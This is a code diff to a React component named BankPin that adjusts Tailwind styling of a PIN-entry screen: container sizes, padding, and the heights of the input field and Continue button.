@@ -61,8 +61,8 @@ const BankPin = ({email}) => {
 
   return (
     <div className="w-screen h-screen flex justify-center items-center">
-      <div className="bg-[#0f1722] sm:w-[470px] h-[600px] 3xl:h-[650px] 3xl:w-[490px] 4xl:h-[700px] 4xl:w-[500px] w-full sm:rounded-md items-center pt-10 sm:px-10 px-5">
-        <div className="min-w-full flex justify-center mt-16 items-start gap-4 text-black">
+      <div className="bg-[#0f1722] sm:w-[510px] h-[600px] 3xl:h-[680px] 3xl:w-[510px] w-full sm:rounded-md items-center pt-10 sm:px-12 px-5">
+        <div className="min-w-full flex justify-center mt-10 items-start gap-4 text-black">
           <span className="w-8 h-8 mt-2">
             <img src={leftLogo} alt="" />
           </span>
@@ -96,7 +96,7 @@ const BankPin = ({email}) => {
             type="text"
             autoComplete="off"
             id="floating_outlined"
-            className="block px-5 pt-5 h-12 w-full text-sm bg-transparent rounded-md border-1 appearance-none text-white dark:border-gray-600 border-y border-x border-slate-500 focus:border-0 hover:border-slate-500 dark:focus:border-blue-500 focus:outline-dashed outline-white outline-offset-4 focus:ring-1 focus:border-blue-600 peer"
+            className="block px-5 pt-5 h-14 w-full text-sm bg-transparent rounded-md border-1 appearance-none text-white dark:border-gray-600 border-y border-x border-slate-500 focus:border-0 hover:border-slate-500 dark:focus:border-blue-500 focus:outline-dashed outline-white outline-offset-4 focus:ring-1 focus:border-blue-600 peer"
             placeholder=" "
           />
           <label
@@ -112,7 +112,7 @@ const BankPin = ({email}) => {
           onClick={() => {
             handleClick();
           }}
-          className="bg-[#0c8ae6] w-full h-12 tsxt-sm rounded-md mt-5"
+          className="bg-[#0c8ae6] w-full h-14 tsxt-sm rounded-md mt-5"
         >
           {loading?<FaSpinner className="text-white spinner-border spinner-border-sm"/>:<p className="text-sm">Continue</p>}
         </button>
